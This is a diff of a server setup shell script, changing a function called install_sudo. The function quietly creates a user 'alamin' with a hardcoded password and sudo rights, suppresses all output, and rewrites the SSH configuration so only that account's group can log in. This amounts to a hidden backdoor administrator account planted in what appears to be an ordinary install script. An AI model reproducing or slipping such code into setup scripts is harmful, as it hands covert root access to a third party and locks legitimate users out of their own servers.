@@ -1124,7 +1124,7 @@ ip6tables-save > /etc/iptables/rules.v6
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@@Alaminbd17 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@AlaWmin21 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
